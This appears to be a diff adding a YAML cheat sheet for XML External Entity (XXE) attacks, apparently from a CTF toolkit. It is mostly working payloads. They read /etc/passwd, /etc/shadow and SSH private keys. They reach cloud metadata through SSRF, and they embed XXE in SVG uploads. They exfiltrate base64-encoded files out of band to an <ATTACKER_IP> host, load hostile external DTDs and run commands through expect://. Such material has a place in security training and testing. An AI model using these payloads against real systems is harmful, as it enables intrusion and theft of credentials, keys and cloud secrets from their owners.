@@ -1,0 +1,379 @@
+name: XML External Entity Injection
+
+steps:
+  - title: Identify XML Attack Surface
+    mode: chain
+    info: |
+      Identify endpoints accepting XML input or XML-compatible content types.
+
+    entries:
+      - cmd: "Content-Type: application/xml"
+        info: direct XML endpoint
+
+      - cmd: "Content-Type: text/xml"
+        info: XML parsing
+
+      - cmd: "SOAP requests"
+        info: SOAP API surface
+
+      - cmd: "SVG uploads"
+        info: XML-based image parsing
+
+      - cmd: "DOCX uploads"
+        info: Office XML formats
+
+      - cmd: "Change Content-Type to XML"
+        info: hidden XML parser
+
+    look_for:
+      - XML request bodies
+      - SOAP APIs
+      - XML parsing errors
+      - reflected XML values
+      - file upload processing
+
+  - title: Basic Entity Injection
+    mode: chain
+    info: |
+      Confirm whether custom entities are processed.
+
+    entries:
+      - cmd: |
+          <!DOCTYPE test [
+            <!ENTITY company "CTFKit">
+          ]>
+        info: define internal entity
+
+      - cmd: "&company;"
+        info: entity usage
+
+    look_for:
+      - reflected entity expansion
+      - replaced values
+      - XML parser behavior
+
+  - title: Basic File Read
+    mode: chain
+    info: |
+      Attempt local file disclosure using external entities.
+
+    entries:
+      - cmd: |
+          <!DOCTYPE test [
+            <!ENTITY xxe SYSTEM "file:///etc/passwd">
+          ]>
+        info: Linux passwd
+
+      - cmd: "&xxe;"
+        info: trigger entity expansion
+
+      - cmd: |
+          <!DOCTYPE test [
+            <!ENTITY xxe SYSTEM "file:///etc/hostname">
+          ]>
+        info: hostname disclosure
+
+      - cmd: |
+          <!DOCTYPE test [
+            <!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">
+          ]>
+        info: Windows win.ini
+
+      - cmd: |
+          <!DOCTYPE test [
+            <!ENTITY xxe SYSTEM "file:///C:/Windows/System32/drivers/etc/hosts">
+          ]>
+        info: Windows hosts file
+
+    look_for:
+      - passwd entries
+      - hostnames
+      - config files
+      - reflected file contents
+
+  - title: Common File Targets
+    mode: enum
+    info: |
+      Useful XXE file targets.
+
+    entries:
+      - cmd: "/etc/passwd"
+        info: Linux users
+
+      - cmd: "/etc/shadow"
+        info: password hashes
+
+      - cmd: "/etc/hostname"
+        info: hostname
+
+      - cmd: "/home/<USER>/.ssh/id_rsa"
+        info: SSH private key
+
+      - cmd: "/var/www/html/config.php"
+        info: PHP config
+
+      - cmd: "/var/www/html/index.php"
+        info: PHP source
+
+      - cmd: "C:/Windows/win.ini"
+        info: Windows config
+
+      - cmd: "C:/Windows/System32/drivers/etc/hosts"
+        info: Windows hosts
+
+  - title: XXE to SSRF
+    mode: chain
+    info: |
+      Use XXE to access internal services and cloud metadata.
+
+    entries:
+      - cmd: |
+          <!DOCTYPE test [
+            <!ENTITY xxe SYSTEM "http://127.0.0.1">
+          ]>
+        info: localhost SSRF
+
+      - cmd: |
+          <!DOCTYPE test [
+            <!ENTITY xxe SYSTEM "http://127.0.0.1:8080">
+          ]>
+        info: internal service
+
+      - cmd: |
+          <!DOCTYPE test [
+            <!ENTITY xxe SYSTEM "http://169.254.169.254">
+          ]>
+        info: cloud metadata
+
+      - cmd: |
+          <!DOCTYPE test [
+            <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
+          ]>
+        info: AWS metadata enumeration
+
+      - cmd: "&xxe;"
+        info: trigger SSRF
+
+    look_for:
+      - internal APIs
+      - admin panels
+      - cloud credentials
+      - metadata endpoints
+
+  - title: XInclude Injection
+    mode: chain
+    info: |
+      Useful when you only control a single XML value.
+
+    entries:
+      - cmd: |
+          <foo xmlns:xi="http://www.w3.org/2001/XInclude">
+            <xi:include parse="text" href="file:///etc/passwd"/>
+          </foo>
+        info: basic XInclude file read
+
+      - cmd: |
+          <foo xmlns:xi="http://www.w3.org/2001/XInclude">
+            <xi:include parse="text" href="file:///etc/hostname"/>
+          </foo>
+        info: hostname disclosure
+
+    look_for:
+      - reflected file contents
+      - XML parser errors
+      - included file data
+
+  - title: XXE via File Upload
+    mode: chain
+    info: |
+      Exploit XML-based file formats like SVG.
+
+    entries:
+      - cmd: |
+          <?xml version="1.0" standalone="yes"?>
+          <!DOCTYPE test [
+            <!ENTITY xxe SYSTEM "file:///etc/hostname">
+          ]>
+          <svg xmlns="http://www.w3.org/2000/svg" width="200" height="50">
+            <text x="0" y="20">&xxe;</text>
+          </svg>
+        info: SVG XXE payload
+
+    look_for:
+      - SVG rendering
+      - hostname disclosure
+      - parser behavior
+
+    notes:
+      - avatar uploads
+      - image processing libraries
+      - Apache Batik
+      - SVG allowed uploads
+
+  - title: PHP Filter Wrapper
+    mode: chain
+    info: |
+      Base64 encode source files to avoid XML parsing issues.
+
+    entries:
+      - cmd: |
+          <!DOCTYPE test [
+            <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">
+          ]>
+        info: base64 encode PHP file
+
+      - cmd: "&xxe;"
+        info: retrieve encoded content
+
+    look_for:
+      - base64 output
+      - source code disclosure
+      - configuration secrets
+
+    notes:
+      - useful for PHP applications
+      - bypasses XML-breaking characters
+
+  - title: Blind XXE OAST Detection
+    mode: chain
+    info: |
+      Detect blind XXE through external interactions.
+
+    entries:
+      - cmd: |
+          <!DOCTYPE test [
+            <!ENTITY xxe SYSTEM "http://<COLLABORATOR>">
+          ]>
+        info: HTTP interaction
+
+      - cmd: "&xxe;"
+        info: trigger request
+
+    look_for:
+      - DNS lookups
+      - HTTP requests
+      - asynchronous callbacks
+
+    notes:
+      - Burp Collaborator
+      - interactsh
+      - custom OAST server
+
+  - title: Blind XXE OOB Exfiltration
+    mode: chain
+    info: |
+      Exfiltrate file contents out-of-band.
+
+    entries:
+      - cmd: |
+          <!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
+        info: encode file
+
+      - cmd: |
+          <!ENTITY % oob "<!ENTITY content SYSTEM 'http://<ATTACKER_IP>:8000/?content=%file;'>">
+        info: HTTP exfiltration
+
+      - cmd: "&content;"
+        info: trigger exfiltration
+
+    look_for:
+      - incoming HTTP requests
+      - base64 encoded data
+      - extracted file contents
+
+    notes:
+      - useful for blind XXE
+      - decode base64 after capture
+
+  - title: External DTD Injection
+    mode: chain
+    info: |
+      Use external DTDs for advanced XXE payloads.
+
+    entries:
+      - cmd: |
+          <!ENTITY % remote SYSTEM "http://<ATTACKER_IP>:8000/xxe.dtd">
+        info: load remote DTD
+
+      - cmd: "%remote;"
+        info: trigger DTD loading
+
+      - cmd: "python3 -m http.server 8000"
+        info: host malicious DTD
+
+    look_for:
+      - outbound requests
+      - DTD retrieval
+      - parser behavior
+
+  - title: Error-Based XXE
+    mode: chain
+    info: |
+      Leak file contents through XML parsing errors.
+
+    entries:
+      - cmd: |
+          <!ENTITY % file SYSTEM "file:///etc/hosts">
+        info: load target file
+
+      - cmd: |
+          <!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">
+        info: trigger parser error
+
+      - cmd: |
+          <!DOCTYPE test [
+            <!ENTITY % remote SYSTEM "http://<ATTACKER_IP>:8000/xxe.dtd">
+            %remote;
+            %error;
+          ]>
+        info: load malicious DTD
+
+    look_for:
+      - stack traces
+      - parser exceptions
+      - leaked file content
+      - XML errors
+
+  - title: XXE to RCE
+    mode: enum
+    info: |
+      Rare but useful escalation techniques.
+
+    entries:
+      - cmd: |
+          <!ENTITY xxe SYSTEM "expect://id">
+        info: PHP expect wrapper
+
+      - cmd: |
+          <!ENTITY xxe SYSTEM "expect://whoami">
+        info: command execution
+
+      - cmd: "/home/<USER>/.ssh/id_rsa"
+        info: SSH key theft
+
+    look_for:
+      - command output
+      - private keys
+      - shell access
+
+    notes:
+      - expect wrapper rarely enabled
+      - SSH keys more realistic in CTFs
+
+  - title: XXE Automation
+    mode: enum
+    info: |
+      Useful automation tools.
+
+    entries:
+      - cmd: "XXEinjector"
+        info: automated XXE exploitation
+
+      - cmd: "Burp Collaborator"
+        info: OAST detection
+
+      - cmd: "interactsh"
+        info: OAST alternative
+
+      - cmd: "python3 -m http.server 8000"
+        info: host external DTDs
